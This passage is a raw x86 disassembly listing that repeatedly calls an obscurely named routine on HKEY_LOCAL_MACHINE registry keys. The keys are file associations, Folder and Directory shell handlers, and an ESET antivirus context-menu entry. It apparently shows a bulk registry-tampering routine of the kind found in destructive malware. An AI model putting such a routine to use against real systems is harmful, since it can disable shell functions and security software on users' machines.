  push 004290FCh ; "SOFTWARE\Classes\.sst"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000324h
  push 0042912Ch ; "SOFTWARE\Classes\.stl"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000325h
  push 0042915Ch ; "SOFTWARE\Classes\.stm\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000326h
  push 004291B0h ; "SOFTWARE\Classes\.stm"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000327h
  push 004291E0h ; "SOFTWARE\Classes\.swf\OpenWithList\IExplore.exe"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000328h
  push 00429244h ; "SOFTWARE\Classes\.swf\OpenWithList"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000329h
  push 004292ACh ; "SOFTWARE\Classes\.swf"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000032Ah
  push 004292DCh ; "SOFTWARE\Classes\.swt"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000032Bh
  push 0042930Ch ; "SOFTWARE\Classes\.sy_\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000032Ch
  push 00429360h ; "SOFTWARE\Classes\.sy_"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000032Dh
  push 00429390h ; "SOFTWARE\Classes\.sym\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000032Eh
  push 004293E4h ; "SOFTWARE\Classes\.sym"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000032Fh
  push 00429414h ; "SOFTWARE\Classes\.sys\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000330h
  push 00429484h ; "SOFTWARE\Classes\.sys"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000331h
  push 004294B4h ; "SOFTWARE\Classes\.tar\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000332h
  push 00429508h ; "SOFTWARE\Classes\.tar"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000333h
  push 00429538h ; "SOFTWARE\Classes\.taz"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000334h
  push 00429568h ; "SOFTWARE\Classes\.tbz"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000335h
  push 00429598h ; "SOFTWARE\Classes\.tbz2"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000336h
  push 004295CCh ; "SOFTWARE\Classes\.tgz\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000337h
  push 00429620h ; "SOFTWARE\Classes\.tgz"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000338h
  push 00429650h ; "SOFTWARE\Classes\.theme"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000339h
  push 00429684h ; "SOFTWARE\Classes\.tif\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000033Ah
  push 004296D8h ; "SOFTWARE\Classes\.tif\OpenWithProgids"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000033Bh
  push 00429728h ; "SOFTWARE\Classes\.tif"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000033Ch
  push 00429758h ; "SOFTWARE\Classes\.tiff\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000033Dh
  push 004297B0h ; "SOFTWARE\Classes\.tiff\OpenWithProgids"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000033Eh
  push 00429834h ; "SOFTWARE\Classes\.tiff"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000033Fh
  push 00429868h ; "SOFTWARE\Classes\.tlb\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000340h
  push 004298BCh ; "SOFTWARE\Classes\.tlb"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000341h
  push 004298ECh ; "SOFTWARE\Classes\.ts"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000342h
  push 0042991Ch ; "SOFTWARE\Classes\.tsp\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000343h
  push 00429970h ; "SOFTWARE\Classes\.tsp"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000344h
  push 004299A0h ; "SOFTWARE\Classes\.tsv"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000345h
  push 00429A10h ; "SOFTWARE\Classes\.ttc\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000346h
  push 00429A64h ; "SOFTWARE\Classes\.ttc"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000347h
  push 00429A94h ; "SOFTWARE\Classes\.ttf\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000348h
  push 00429AE8h ; "SOFTWARE\Classes\.ttf"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000349h
  push 00429B18h ; "SOFTWARE\Classes\.UDL"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000034Ah
  push 00429B48h ; "SOFTWARE\Classes\.uls"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000034Bh
  push 00429BECh ; "SOFTWARE\Classes\.url\ShellEx\{FBF23B80-E3F0-101B-8488-00AA003E56F8}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000034Ch
  push 00429C7Ch ; "SOFTWARE\Classes\.url\ShellEx\{CABB0DA0-DA57-11CF-9974-0020AFD79762}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000034Dh
  push 00429D0Ch ; "SOFTWARE\Classes\.url\ShellEx\{00021500-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000034Eh
  push 00429DCCh ; "SOFTWARE\Classes\.url\ShellEx\{000214F9-0000-0000-C000-000000000046}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000034Fh
  push 00429E5Ch ; "SOFTWARE\Classes\.url\ShellEx\{000214EE-0000-0000-C000-000000000046}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000350h
  push 00429EECh ; "SOFTWARE\Classes\.url\ShellEx"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000351h
  push 00429F2Ch ; "SOFTWARE\Classes\.url\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000352h
  push 00429F80h ; "SOFTWARE\Classes\.url"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000353h
  push 00429D9Ch ; "SOFTWARE\Classes\.uu"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000354h
  push 00429B78h ; "SOFTWARE\Classes\.uue"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000355h
  push 00429BA8h ; "SOFTWARE\Classes\.VBE"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000356h
  push 004299D0h ; "SOFTWARE\Classes\.vbg"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000357h
  push 00429804h ; "SOFTWARE\Classes\.vbl"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000358h
  push 00429FB0h ; "SOFTWARE\Classes\.vbr"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000359h
  push 00429FE0h ; "SOFTWARE\Classes\.vbs\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000035Ah
  push 0042A034h ; "SOFTWARE\Classes\.vbs"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000035Bh
  push 0042A064h ; "SOFTWARE\Classes\.vbw"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000035Ch
  push 0042A094h ; "SOFTWARE\Classes\.vbx\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000035Dh
  push 0042A0E8h ; "SOFTWARE\Classes\.vbx"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000035Eh
  push 0042A118h ; "SOFTWARE\Classes\.vbz"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000035Fh
  push 0042A148h ; "SOFTWARE\Classes\.vcf"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000360h
  push 0042A18Ch ; "SOFTWARE\Classes\.vob"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000361h
  push 0042A1BCh ; "SOFTWARE\Classes\.vxd\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000362h
  push 0042A210h ; "SOFTWARE\Classes\.vxd"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000363h
  push 0042A240h ; "SOFTWARE\Classes\.wab"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000364h
  push 0042A270h ; "SOFTWARE\Classes\.wav\ShellNew"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000365h
  push 0042A2B4h ; "SOFTWARE\Classes\.wav\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000366h
  push 0042A308h ; "SOFTWARE\Classes\.wav\OpenWithProgIds"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000367h
  push 0042A36Ch ; "SOFTWARE\Classes\.wav\OpenWithList\wmplayer.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000368h
  push 0042A3D0h ; "SOFTWARE\Classes\.wav\OpenWithList\sndrec32.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000369h
  push 0042A434h ; "SOFTWARE\Classes\.wav\OpenWithList"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000036Ah
  push 0042A480h ; "SOFTWARE\Classes\.wav"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000036Bh
  push 0042A4B0h ; "SOFTWARE\Classes\Folder\shellex\PropertySheetHandlers"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000036Ch
  push 0042A520h ; "SOFTWARE\Classes\Folder\shellex\DragDropHandlers\WinRAR"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000036Dh
  push 0042A594h ; "SOFTWARE\Classes\Folder\shellex\DragDropHandlers\{BD472F60-27FA-11cf-B8B4-444553540000}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000036Eh
  push 0042A648h ; "SOFTWARE\Classes\Folder\shellex\DragDropHandlers"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000036Fh
  push 0042A710h ; "SOFTWARE\Classes\Folder\shellex\ContextMenuHandlers\WinRAR"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000370h
  push 0042A78Ch ; "SOFTWARE\Classes\Folder\shellex\ContextMenuHandlers\ESET Smart Security - Context Menu Shell Extension"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000371h
  push 0042A860h ; "SOFTWARE\Classes\Folder\shellex\ContextMenuHandlers"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000372h
  push 0042A8CCh ; "SOFTWARE\Classes\Folder\shellex\ColumnHandlers\{66742402-F9B9-11D1-A202-0000F81FEDEE}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000373h
  push 0042A97Ch ; "SOFTWARE\Classes\Folder\shellex\ColumnHandlers\{24F14F02-7B1C-11d1-838f-0000F80461CF}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000374h
  push 0042AA84h ; "SOFTWARE\Classes\Folder\shellex\ColumnHandlers\{24F14F01-7B1C-11d1-838f-0000F80461CF}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000375h
  push 0042AB34h ; "SOFTWARE\Classes\Folder\shellex\ColumnHandlers\{0D2E74C4-3C34-11d2-A27E-00C04FC30871}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000376h
  push 0042ABE4h ; "SOFTWARE\Classes\Folder\shellex\ColumnHandlers"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000377h
  push 0042ABE4h ; "SOFTWARE\Classes\Folder\shellex\ColumnHandlers"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000378h
  push 0042AA2Ch ; "SOFTWARE\Classes\Folder\shellex"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000379h
  push 0042AC74h ; "SOFTWARE\Classes\Folder\shell\open\ddeexec\topic"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000037Ah
  push 0042ACDCh ; "SOFTWARE\Classes\Folder\shell\open\ddeexec\ifexec"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000037Bh
  push 0042AD44h ; "SOFTWARE\Classes\Folder\shell\open\ddeexec\application"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000037Ch
  push 0042ADB8h ; "SOFTWARE\Classes\Folder\shell\open\ddeexec"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000037Dh
  push 0042AE14h ; "SOFTWARE\Classes\Folder\shell\open"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000037Eh
  push 0042AE60h ; "SOFTWARE\Classes\Folder\shell\explore\ddeexec\topic"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000037Fh
  push 0042AECCh ; "SOFTWARE\Classes\Folder\shell\explore\ddeexec\ifexec"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000380h
  push 0042AF3Ch ; "SOFTWARE\Classes\Folder\shell\explore\ddeexec\application"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000381h
  push 0042AFB4h ; "SOFTWARE\Classes\Folder\shell\explore\ddeexec"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000382h
  push 0042A6B0h ; "SOFTWARE\Classes\Folder\shell\explore\command"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000383h
  push 0042B014h ; "SOFTWARE\Classes\Folder\shell\explore"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000384h
  push 0042B064h ; "SOFTWARE\Classes\Folder\shell\open\command"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000385h
  push 0042AE14h ; "SOFTWARE\Classes\Folder\shell\open"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000386h
  push 0042B0C0h ; "SOFTWARE\Classes\Folder\shell"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000387h
  push 0042B100h ; "SOFTWARE\Classes\Folder\DefaultIcon"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000388h
  push 0042B14Ch ; "SOFTWARE\Classes\Folder"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000389h
  push 0042B1FCh ; "SOFTWARE\Classes\Directory\shellex\PropertySheetHandlers\Sharing"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000038Ah
  push 0042B284h ; "SOFTWARE\Classes\Directory\shellex\PropertySheetHandlers\{ef43ecfe-2ab9-4632-bf21-58909dd177f0}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000038Bh
  push 0042B3ECh ; "SOFTWARE\Classes\Directory\shellex\PropertySheetHandlers\{ECCDF543-45CC-11CE-B9BF-0080C87CDBA6}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000038Ch
  push 0042B4B0h ; "SOFTWARE\Classes\Directory\shellex\PropertySheetHandlers\{596AB062-B4D2-4215-9F74-E9109B0A8153}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000038Dh
  push 0042B5E0h ; "SOFTWARE\Classes\Directory\shellex\PropertySheetHandlers\{1F2E5C40-9550-11CE-99D2-00AA006E086C}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
